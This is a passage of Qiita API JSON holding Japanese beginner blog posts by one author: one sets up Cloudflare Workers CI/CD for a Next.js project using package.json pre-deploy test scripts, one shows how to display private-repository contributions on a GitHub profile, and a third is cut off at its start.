data-lang=\"diff_json\" data-sourcepos=\"43:1-61:3\">\n<div class=\"code-lang\"><span class=\"bold\">package.json</span></div>\n<div class=\"highlight\"><pre><code><span class=\"p\">{</span>\n<span class=\"w\">  </span><span class=\"nl\">\"scripts\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">{</span>\n<span class=\"w\">    </span><span class=\"nl\">\"dev\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"next dev\"</span><span class=\"p\">,</span>\n<span class=\"w\">    </span><span class=\"nl\">\"build\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"next build\"</span><span class=\"p\">,</span>\n<span class=\"w\">    </span><span class=\"nl\">\"start\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"next start\"</span><span class=\"p\">,</span>\n<span class=\"w\">    </span><span class=\"nl\">\"lint\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"next lint\"</span><span class=\"p\">,</span>\n<span class=\"w\">    </span><span class=\"nl\">\"deploy\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"opennextjs-cloudflare build &amp;&amp; opennextjs-cloudflare deploy\"</span><span class=\"p\">,</span>\n<span class=\"w\">    </span><span class=\"nl\">\"preview\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"opennextjs-cloudflare build &amp;&amp; opennextjs-cloudflare preview\"</span><span class=\"p\">,</span>\n<span class=\"w\">    </span><span class=\"nl\">\"cf-typegen\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"wrangler types --env-interface CloudflareEnv ./cloudflare-env.d.ts\"</span><span class=\"p\">,</span>\n<span class=\"w\">    </span><span class=\"nl\">\"db:generate\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"npx drizzle-kit generate\"</span><span class=\"p\">,</span>\n<span class=\"w\">    </span><span class=\"nl\">\"db:push\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"npx drizzle-kit migrate\"</span><span class=\"p\">,</span>\n<span class=\"hdl\"><span class=\"err\">-</span><span class=\"w\">   </span><span class=\"nl\">\"test\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"jest\"</span><span class=\"p\">,</span>\n</span><span class=\"hil\"><span class=\"err\">+</span><span class=\"w\">   </span><span class=\"nl\">\"test\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"jest --runInBand --detectOpenHandles --forceExit\"</span><span class=\"p\">,</span>\n</span><span class=\"hil\"><span class=\"err\">+</span><span class=\"w\">   </span><span class=\"nl\">\"predeploy\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"npm run test\"</span><span class=\"p\">,</span>\n</span><span class=\"hil\"><span class=\"err\">+</span><span class=\"w\">   </span><span class=\"nl\">\"prepreview\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"npm run test\"</span>\n</span><span class=\"w\">  </span><span class=\"p\">},</span>\n<span class=\"p\">}</span>\n</code></pre></div>\n</div>\n<div data-sourcepos=\"63:1-66:3\" class=\"note warn\">\n<span class=\"fa fa-fw fa-exclamation-circle\"></span><div>\n<p data-sourcepos=\"64:1-65:205\"><strong>testコマンドについて</strong><br>\njestに<code> --runInBand --detectOpenHandles --forceExit</code>オプションをつけない場合、テストが正常に完了しても、プロセスが完了せず、buildコマンドが実行されません。</p>\n</div>\n</div>\n<h1 data-sourcepos=\"68:1-68:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"69:1-69:121\">GitHubActionsで苦労したからか、GUIで簡単にデプロイができることにありがたみを感じます。</p>\n<h1 data-sourcepos=\"71:1-71:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"74:1-74:57\"><iframe id=\"qiita-embed-content__ce8649ae686bcb15824dad21a1601b71\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__ce8649ae686bcb15824dad21a1601b71\" data-content=\"https%3A%2F%2Fqiita.com%2Fmasafumi1073%2Fitems%2Ff0b002ae7551ebb47d42\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"76:1-76:55\"><iframe id=\"qiita-embed-content__bc627b8c6a2cebf59355b3c30b0f8bd4\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__bc627b8c6a2cebf59355b3c30b0f8bd4\" data-content=\"https%3A%2F%2Fdevelopers.cloudflare.com%2Fworkers%2Fci-cd%2Fbuilds%2F\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"78:1-78:75\"><iframe id=\"qiita-embed-content__82c5de02e65c3aae8b4675ad33134385\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__82c5de02e65c3aae8b4675ad33134385\" data-content=\"https%3A%2F%2Fdevelopers.cloudflare.com%2Fworkers%2Fframework-guides%2Fweb-apps%2Fnextjs%2F\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\n前回、FirebaseAppHostingを使ってNext.jsプロジェクトのCI/CDに挑戦しました。\nコミュニティ内で「Cloudflareが熱いよ！」と教えてもらい、Cloudflareを使ったCI/CD環境の構築に挑戦してみました。備忘録として調べたことをまとめます。\n\n# 前提\n本記事では以下の設定が完了していることを前提としています。\n* Next.jsプロジェクトが作成済み\n* Cloudflare、GitHubアカウント作成済み\n* Next.jsのプロジェクトをCloudflareを使ってCLIでデプロイできる状態\n* Jestによるテスト環境が構築済み\n\n設定方法は下記のドキュメントを参考にしました。\n\nhttps://developers.cloudflare.com/workers/framework-guides/web-apps/nextjs/\n\n# 1.Cloudflareでの自動デプロイ設定（CD）\nCloudflareコンソールにログイン後、Account Home画面で対象のプロジェクトを選択\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/47b08a11-cc31-46de-8044-63641fb41872.png)\n\nSettingsを選択\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/0f7d23f6-3a30-44ff-97d5-b20500645383.png)\n\n画面を下へスクロールすると、`Build`項目があります。\nGitHub連携を行い、リポジトリを指定します。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/c13bf3a2-b1c5-42c6-bd4f-4b6c06b1d9ca.png)\n\nBuild configurationの編集ボタンを押下し、コマンドを登録します。\n`Deploy command`にpackage.jsonにて指定したdeployコマンドから`npm run deploy`を指定、Updateで登録\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/a0ade10b-a86e-43fb-981c-f3e4de69c494.png)\n\nDeploymentsタブでビルド時のログを確認できます。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/06c5dd7b-1e1b-4050-91c6-8ad03fb0ce95.png)\n\n# 2.テスト自動実行の設定（CI）\n\nデプロイ前にテストを実行するため、package.jsonにpre実行コマンドを追加しました。\n\n```diff_json:package.json\n{\n  \"scripts\": {\n    \"dev\": \"next dev\",\n    \"build\": \"next build\",\n    \"start\": \"next start\",\n    \"lint\": \"next lint\",\n    \"deploy\": \"opennextjs-cloudflare build && opennextjs-cloudflare deploy\",\n    \"preview\": \"opennextjs-cloudflare build && opennextjs-cloudflare preview\",\n    \"cf-typegen\": \"wrangler types --env-interface CloudflareEnv ./cloudflare-env.d.ts\",\n    \"db:generate\": \"npx drizzle-kit generate\",\n    \"db:push\": \"npx drizzle-kit migrate\",\n-   \"test\": \"jest\",\n+   \"test\": \"jest --runInBand --detectOpenHandles --forceExit\",\n+   \"predeploy\": \"npm run test\",\n+   \"prepreview\": \"npm run test\"\n  },\n}\n```\n\n:::note warn\n**testコマンドについて**\njestに` --runInBand --detectOpenHandles --forceExit`オプションをつけない場合、テストが正常に完了しても、プロセスが完了せず、buildコマンドが実行されません。\n:::\n\n# おわりに\nGitHubActionsで苦労したからか、GUIで簡単にデプロイができることにありがたみを感じます。\n\n# 参考\n\n\nhttps://qiita.com/masafumi1073/items/f0b002ae7551ebb47d42\n\nhttps://developers.cloudflare.com/workers/ci-cd/builds/\n\nhttps://developers.cloudflare.com/workers/framework-guides/web-apps/nextjs/\n","coediting":false,"comments_count":0,"created_at":"2025-08-10T12:49:00+09:00","group":null,"id":"eb785e6204e3da073dbd","likes_count":2,"private":false,"reactions_count":0,"stocks_count":0,"tags":[{"name":"Next.js","versions":[]},{"name":"CloudflareWorkers","versions":[]},{"name":"cloudflar","versions":[]}],"title":"【Next.js + Cloudflare Workers】Cloudflare WorkersでNext.jsプロジェクトのCI/CDを実現する","updated_at":"2025-08-10T12:49:00+09:00","url":"https://qiita.com/asa129/items/eb785e6204e3da073dbd","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":392,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-3:178\">これまでは、GitHub上で草を生やすために、リポジトリを「publicに設定する」＋「デフォルトブランチへpushする」ことで活動記録を残していました。<br>\n先日、ある記事を読んでいたところ、privateリポジトリでも草を生やせることを知りました。備忘録のために、方法をまとめました。</p>\n<h1 data-sourcepos=\"5:1-5:26\">\n<span id=\"草を生やすとは\" class=\"fragment\"></span><a href=\"#%E8%8D%89%E3%82%92%E7%94%9F%E3%82%84%E3%81%99%E3%81%A8%E3%81%AF\"><i class=\"fa fa-link\"></i></a>草を生やすとは？</h1>\n<p data-sourcepos=\"6:1-6:237\">GitHubではcommitやpull requestをすると、活動記録として表示してくれます。履歴を緑色のマスで表示されるため、草が生えているように見えることから草と呼ばれているそうです。</p>\n<p data-sourcepos=\"8:1-8:40\"><strong>公式ドキュメントより引用</strong></p>\n<blockquote data-sourcepos=\"10:1-11:123\">\n<p data-sourcepos=\"10:3-11:123\">コントリビューションカレンダーは、コントリビューションアクティビティを表示します。<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fed1f244a-7b75-426b-aef8-177731b44dab.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=11e5d6f489a06b7f068ecb57c7fd579c\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fed1f244a-7b75-426b-aef8-177731b44dab.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=11e5d6f489a06b7f068ecb57c7fd579c\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fed1f244a-7b75-426b-aef8-177731b44dab.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=4c67c18b6db40597ca4ff9cd006736b0 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/ed1f244a-7b75-426b-aef8-177731b44dab.png\" loading=\"lazy\"></a></p>\n</blockquote>\n<h1 data-sourcepos=\"13:1-13:23\">\n<span id=\"githubの設定方法\" class=\"fragment\"></span><a href=\"#github%E3%81%AE%E8%A8%AD%E5%AE%9A%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>GitHubの設定方法</h1>\n<h4 data-sourcepos=\"14:1-14:53\">\n<span id=\"1githubにログインしsettingsを開く\" class=\"fragment\"></span><a href=\"#1github%E3%81%AB%E3%83%AD%E3%82%B0%E3%82%A4%E3%83%B3%E3%81%97settings%E3%82%92%E9%96%8B%E3%81%8F\"><i class=\"fa fa-link\"></i></a>1.GitHubにログインし、<code>Settings</code>を開く</h4>\n<p data-sourcepos=\"15:1-15:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F86b68e60-7607-4df8-9514-2db5777257a1.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=ab0ce6e934334f836a49005187f4704f\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F86b68e60-7607-4df8-9514-2db5777257a1.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=ab0ce6e934334f836a49005187f4704f\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F86b68e60-7607-4df8-9514-2db5777257a1.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=13a6936141327fc5262585cf72c49c3d 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/86b68e60-7607-4df8-9514-2db5777257a1.png\" loading=\"lazy\"></a></p>\n<h4 data-sourcepos=\"17:1-17:75\">\n<span id=\"2public-profileページからcontributions--activityを見つける\" class=\"fragment\"></span><a href=\"#2public-profile%E3%83%9A%E3%83%BC%E3%82%B8%E3%81%8B%E3%82%89contributions--activity%E3%82%92%E8%A6%8B%E3%81%A4%E3%81%91%E3%82%8B\"><i class=\"fa fa-link\"></i></a>2.Public profileページからContributions &amp; activityを見つける</h4>\n<p data-sourcepos=\"18:1-19:89\">画面を下へスクロールすると<code>Contributions &amp; activity</code>項目があります。<br>\n<code>Include private contributions on my profile</code>にチェック、<code>Update preferences</code>押下</p>\n<p data-sourcepos=\"21:1-21:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fff720643-222e-437b-bb75-7fd123e40e87.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=1363e66f3c7f96d17d12c1520fe4a40f\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fff720643-222e-437b-bb75-7fd123e40e87.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=1363e66f3c7f96d17d12c1520fe4a40f\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fff720643-222e-437b-bb75-7fd123e40e87.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=a62567b3bb7db75dda91c10d3234f3bb 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/ff720643-222e-437b-bb75-7fd123e40e87.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"23:1-23:35\">\n<span id=\"実際に草が生えるか確認\" class=\"fragment\"></span><a href=\"#%E5%AE%9F%E9%9A%9B%E3%81%AB%E8%8D%89%E3%81%8C%E7%94%9F%E3%81%88%E3%82%8B%E3%81%8B%E7%A2%BA%E8%AA%8D\"><i class=\"fa fa-link\"></i></a>実際に草が生えるか確認</h1>\n<p data-sourcepos=\"25:1-25:11\"><strong>push前</strong></p>\n<p data-sourcepos=\"27:1-27:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Ffb7cbcd7-0483-4d29-a4e1-6936d878ab0c.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=6eaa6e9ca74f6272d06c6285ee75c98b\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Ffb7cbcd7-0483-4d29-a4e1-6936d878ab0c.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=6eaa6e9ca74f6272d06c6285ee75c98b\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Ffb7cbcd7-0483-4d29-a4e1-6936d878ab0c.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=0d3e292b81068a7c528266163259eb65 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/fb7cbcd7-0483-4d29-a4e1-6936d878ab0c.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"29:1-29:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F8ba9b653-b776-49f3-8649-6000390c1e93.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=0a134d30414ba31556da7af342832c76\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F8ba9b653-b776-49f3-8649-6000390c1e93.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=0a134d30414ba31556da7af342832c76\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F8ba9b653-b776-49f3-8649-6000390c1e93.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=b38eca7bc2d7cbba174c783091f9c6f9 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/8ba9b653-b776-49f3-8649-6000390c1e93.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"31:1-31:11\"><strong>push後</strong></p>\n<p data-sourcepos=\"33:1-33:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fd99a4ad2-bff2-4efa-a1b5-35141863007e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=225523472ce7f802880fbe39f90eac5a\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fd99a4ad2-bff2-4efa-a1b5-35141863007e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=225523472ce7f802880fbe39f90eac5a\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fd99a4ad2-bff2-4efa-a1b5-35141863007e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=4118f86eeda5381c3c8341d775b7f580 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/d99a4ad2-bff2-4efa-a1b5-35141863007e.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"35:1-35:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F79a7e8d3-2984-481f-a6a4-cb0442ea24f0.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=f5414c19466875f8dbe32385b8094cae\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F79a7e8d3-2984-481f-a6a4-cb0442ea24f0.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=f5414c19466875f8dbe32385b8094cae\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F79a7e8d3-2984-481f-a6a4-cb0442ea24f0.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=a861674c0a052e1b748ab65d81391045 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/79a7e8d3-2984-481f-a6a4-cb0442ea24f0.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"37:1-37:30\">反映されていました。</p>\n<h1 data-sourcepos=\"39:1-39:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"40:1-40:237\">毎日活動しているのに記録が残らないのはもったいない！けど、学習用のリポジトリをpublicにすることには抵抗がありました。もっと早く知りたかったと思った出来事でした。</p>\n<h1 data-sourcepos=\"42:1-42:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"43:1-43:93\"><iframe id=\"qiita-embed-content__08437edcf8db01a511f4298d326ab423\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__08437edcf8db01a511f4298d326ab423\" data-content=\"https%3A%2F%2Fdocs.github.com%2Fja%2Faccount-and-profile%2Fconcepts%2Fviewing-contributions-on-your-profile\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"45:1-45:71\"><iframe id=\"qiita-embed-content__7f2cc7aa0564f2487bd987f28b7a346c\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__7f2cc7aa0564f2487bd987f28b7a346c\" data-content=\"https%3A%2F%2Fnote.lapras.com%2Fmethod%2Fescore-improvement%2F%3Fsource%3Dscore_up_mail\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nこれまでは、GitHub上で草を生やすために、リポジトリを「publicに設定する」＋「デフォルトブランチへpushする」ことで活動記録を残していました。\n先日、ある記事を読んでいたところ、privateリポジトリでも草を生やせることを知りました。備忘録のために、方法をまとめました。\n\n# 草を生やすとは？\nGitHubではcommitやpull requestをすると、活動記録として表示してくれます。履歴を緑色のマスで表示されるため、草が生えているように見えることから草と呼ばれているそうです。\n\n**公式ドキュメントより引用**\n\n> コントリビューションカレンダーは、コントリビューションアクティビティを表示します。\n>![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/ed1f244a-7b75-426b-aef8-177731b44dab.png)\n\n# GitHubの設定方法\n#### 1.GitHubにログインし、`Settings`を開く\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/86b68e60-7607-4df8-9514-2db5777257a1.png)\n\n#### 2.Public profileページからContributions & activityを見つける\n画面を下へスクロールすると`Contributions & activity`項目があります。\n`Include private contributions on my profile`にチェック、`Update preferences`押下\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/ff720643-222e-437b-bb75-7fd123e40e87.png)\n\n# 実際に草が生えるか確認\n\n**push前**\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/fb7cbcd7-0483-4d29-a4e1-6936d878ab0c.png)\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/8ba9b653-b776-49f3-8649-6000390c1e93.png)\n\n**push後**\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/d99a4ad2-bff2-4efa-a1b5-35141863007e.png)\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/79a7e8d3-2984-481f-a6a4-cb0442ea24f0.png)\n\n反映されていました。\n\n# おわりに\n毎日活動しているのに記録が残らないのはもったいない！けど、学習用のリポジトリをpublicにすることには抵抗がありました。もっと早く知りたかったと思った出来事でした。\n\n# 参考\nhttps://docs.github.com/ja/account-and-profile/concepts/viewing-contributions-on-your-profile\n\nhttps://note.lapras.com/method/escore-improvement/?source=score_up_mail\n","coediting":false,"comments_count":0,"created_at":"2025-08-09T11:25:04+09:00","group":null,"id":"419287c7220c6d984e37","likes_count":3,"private":false,"reactions_count":0,"stocks_count":1,"tags":[{"name":"Git","versions":[]},{"name":"GitHub","versions":[]},{"name":"初心者","versions":[]}],"title":"【GitHub】privateリポジトリでも草を生やしたい","updated_at":"2025-08-09T11:25:04+09:00","url":"https://qiita.com/asa129/items/419287c7220c6d984e37","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":505,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:100\">今回、初めてNext.jsを使用して技術ブログを作成することに挑戦しました。</p>\n<p data-sourcepos=\"4:1-4:203\">開発中はレンダリングの使い分けについて戸惑ったり、これまでのCI/CD方法が通用せず新しい方法を模索したりとつまずきポイントが多くありました。</p>\n<p data-sourcepos=\"6:1-6:120\">この記事では作成したものと、その過程で得た自分なりの気づきを残したいと思います。</p>\n<h1 data-sourcepos=\"8:1-8:20\">\n<span id=\"作成したもの\" class=\"fragment\"></span><a href=\"#%E4%BD%9C%E6%88%90%E3%81%97%E3%81%9F%E3%82%82%E3%81%AE\"><i class=\"fa fa-link\"></i></a>作成したもの</h1>\n<p data-sourcepos=\"10:1-10:166\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F92c8f460-d6c9-4233-9268-f747f79e03a7.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=1cfecf30aa46738f635339b7d6f6fce1\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F92c8f460-d6c9-4233-9268-f747f79e03a7.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=1cfecf30aa46738f635339b7d6f6fce1\" alt=\"tech-blog--tech-blog-1eb1a.asia-east1.hosted.app_.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F92c8f460-d6c9-4233-9268-f747f79e03a7.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=d19ead52df990713fb453acb1b043ed0 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/92c8f460-d6c9-4233-9268-f747f79e03a7.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"12:1-12:35\"><iframe id=\"qiita-embed-content__d812164bac9a06bc3e04facbf70d4498\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__d812164bac9a06bc3e04facbf70d4498\" data-content=\"https%3A%2F%2Fgithub.com%2Fasa129%2Ftech-blog\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h1 